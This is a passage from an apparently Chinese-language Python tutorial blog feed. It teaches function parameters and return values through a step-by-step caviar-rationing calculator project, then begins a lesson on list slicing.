class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种不定长参数会返回一种元组类型，如果你觉得不好看，我们可以用循环将其依次取出。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">,</span><span class="token operator">*</span>course<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> course<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'编程'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>🐱‍🐉<strong>试一试，定义一个函数，要求把第一个参数设置为不定长参数。</strong></p><p>看一下prints()函数的文档，第一个参数是不是就是不定长参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我'</span><span class="token punctuation">,</span> <span class="token string">'正在'</span><span class="token punctuation">,</span> <span class="token string">'学习编程'</span><span class="token punctuation">,</span> sep <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我'</span><span class="token punctuation">,</span> <span class="token string">'正在'</span><span class="token punctuation">,</span> <span class="token string">'学习编程'</span><span class="token punctuation">,</span> sep <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-函数的返回值"><a href="#2-函数的返回值" class="headerlink" title="2.函数的返回值"></a>2.函数的返回值</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">wage</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> month <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">5000</span> <span class="token operator">*</span> month    <span class="token keyword">else</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">6000</span> <span class="token operator">*</span> month    <span class="token keyword">return</span> money month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'你工作了多少个月:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>money <span class="token operator">=</span> wage<span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"你的工资为</span><span class="token interpolation"><span class="token punctuation">{</span>money<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数也可以返回多个值，但需要注意，不要依次写多个return，因为遇到第一个return，函数就结束了，后面的程序不会执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">wage</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    bonus <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> month    <span class="token keyword">if</span> month <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">5000</span> <span class="token operator">*</span> month    <span class="token keyword">else</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token number">6000</span> <span class="token operator">*</span> month    <span class="token keyword">return</span> money<span class="token punctuation">,</span>bonusmonth <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'你工作了多少个月:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>money <span class="token operator">=</span> wage<span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h1><h2 id="一、任务需求"><a href="#一、任务需求" class="headerlink" title="一、任务需求"></a>一、任务需求</h2><p>假设你是联合国主席兼世界首富，想要捐助你的母校海盐商贸学校若干箱鱼子酱，以改善同学们的伙食，但是买得少了不够吃，买得太多吃不完，过了保质期会造成浪费，所以需要一个程序来计算数量，计算方式有两种。</p><ul><li>已知每位同学每月能够吃10箱鱼子酱。</li><li>计算方式1：时间计算<br>🐱‍👤例如输入10000箱鱼子酱、共有100位同学，程序帮我们计算出鱼子酱可以供同学们食用10个月。</li><li>计算方式2：人力计算<br>🐱‍👤例如输入10000箱鱼子酱，但是保质期只有两个月了，程序帮我们计算出至少需要找500位同学才能按时吃完。<h2 id="二、初始版本"><a href="#二、初始版本" class="headerlink" title="二、初始版本"></a>二、初始版本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 已知每位同学每个月能吃完10箱鱼子酱</span><span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span><span class="token keyword">def</span> <span class="token function">JiSuan_month</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span><span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span><span class="token keyword">def</span> <span class="token function">JiSuan_student_num</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    student_num <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>JiSuan_month<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>               <span class="token comment">#调用时间计算函数</span>JiSuan_student_num<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>           <span class="token comment">#调用人力计算函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、修复BUG"><a href="#三、修复BUG" class="headerlink" title="三、修复BUG"></a>三、修复BUG</h2>在使用一段时间之后，我们发现了一个bug，举例来说，当采购了10000箱鱼子酱，保质期为三个月，程序计算出需要至少找333.3个同学来吃才能够按时吃完，我们没有办法去找0.3位同学，所以这个时候可以向上取整。<br>向上取整我们可以使用math.ceil()函数，使用之前记得import。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token comment">#时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span><span class="token keyword">def</span> <span class="token function">JiSuan_month</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span><span class="token comment">#人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span><span class="token keyword">def</span> <span class="token function">JiSuan_student_num</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token punctuation">)</span><span class="token punctuation">:</span>    student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>JiSuan_month<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>               <span class="token comment">#调用时间计算函数</span>JiSuan_student_num<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>           <span class="token comment">#调用人力计算函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、合并函数"><a href="#四、合并函数" class="headerlink" title="四、合并函数"></a>四、合并函数</h2><p>现在程序已经没有BUG了，但是需要分别调用两个函数，比较麻烦，我们能不能想办法把两个函数合并为一个函数呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>JiSuan<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、增进体验"><a href="#五、增进体验" class="headerlink" title="五、增进体验"></a>五、增进体验</h2><p>虽然现在函数的调用变简单了，但是对于用户来说还是太难了，因为这个程序只能是程序员会用，只有程序员才知道函数括号里的参数应该怎么填，应该怎么改。如果我们现在要交付给用户使用，应该如何改进呢？🤷‍♂️</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入计算的类型（1、时间计算 2、人力计算）:'</span><span class="token punctuation">)</span>    yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入学生的数量:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        JiSuan<span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span>student_num<span class="token punctuation">)</span>    <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入鱼子酱的保质期（月）：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        JiSuan<span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>month<span class="token operator">=</span>month<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新输入'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、结构化设计"><a href="#六、结构化设计" class="headerlink" title="六、结构化设计"></a>六、结构化设计</h2><p>现在用户的确可以使用了，但是对于程序员来说，又不符合程序设计的结构性原则，不仅自己很难维护，别人也很难阅读，我们需要按照逻辑的划分对代码进行封装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#已知每位同学每个月能吃完10箱鱼子酱</span><span class="token keyword">import</span> math<span class="token keyword">def</span> <span class="token function">JiSuan</span><span class="token punctuation">(</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 时间计算、已知有食堂买了多少箱鱼子酱，以及有多少位同学，计算鱼子酱供学生食用多少个月。</span>    <span class="token keyword">if</span> student_num <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        month <span class="token operator">=</span> yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>student_num<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且有</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学,那么鱼子酱课供学生食用</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 人力计算、已知有食堂买了多少箱鱼子酱，以及鱼子酱的保质期，计算需要找多少位同学来吃，才能在保质期内按时吃完。</span>    <span class="token keyword">elif</span> student_num <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> month <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        student_num <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>yzj_num<span class="token operator">/</span><span class="token punctuation">(</span>month<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"如果食堂采购了</span><span class="token interpolation"><span class="token punctuation">{</span>yzj_num<span class="token punctuation">}</span></span><span class="token string">箱鱼子酱,且保质期为</span><span class="token interpolation"><span class="token punctuation">{</span>month<span class="token punctuation">}</span></span><span class="token string">个月,至少需要找</span><span class="token interpolation"><span class="token punctuation">{</span>student_num<span class="token punctuation">}</span></span><span class="token string">位同学才能按时吃完"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'函数参数设置有误'</span><span class="token punctuation">)</span><span class="token comment">#获取用户输入</span><span class="token keyword">def</span> <span class="token function">UserInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        user_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入计算的类型（1、时间计算 2、人力计算）:'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user_choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            student_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入学生的数量:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            month <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">break</span>        <span class="token keyword">elif</span> user_choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            yzj_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入食堂一共采购了多少箱鱼子酱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            month <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入鱼子酱的保质期（月）：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            student_num <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入有误，请重新输入'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> yzj_num<span class="token punctuation">,</span>student_num<span class="token punctuation">,</span>month<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> UserInput<span class="token punctuation">(</span><span class="token punctuation">)</span>    yzj_num <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    student_num <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    month <span class="token operator">=</span> user_input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    JiSuan<span class="token punctuation">(</span>yzj_num<span class="token operator">=</span>yzj_num<span class="token punctuation">,</span>student_num<span class="token operator">=</span>student_num<span class="token punctuation">,</span>month<span class="token operator">=</span>month<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大功告成😁😍😁，是不是一个看似很简单的程序，但是程序设计的流程其实是很严谨的，我希望我们可以通过一个简单的程序，去体会程序开发的思想。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法2—剪刀石头布</title>
      <link href="/2022/02/16/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%952%E2%80%94%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83/"/>
      <url>/2022/02/16/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%952%E2%80%94%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h2 id="一、列表的使用"><a href="#一、列表的使用" class="headerlink" title="一、列表的使用"></a>一、列表的使用</h2><h3 id="1-从列表中提取单个元素"><a href="#1-从列表中提取单个元素" class="headerlink" title="1.从列表中提取单个元素"></a>1.从列表中提取单个元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-从列表中提取多个元素"><a href="#2-从列表中提取多个元素" class="headerlink" title="2.从列表中提取多个元素"></a>2.从列表中提取多个元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：列表切片遵循原则：“左包右不包”。</p><h3 id="3-增加元素"><a href="#3-增加元素" class="headerlink" title="3.增加元素"></a>3.增加元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span 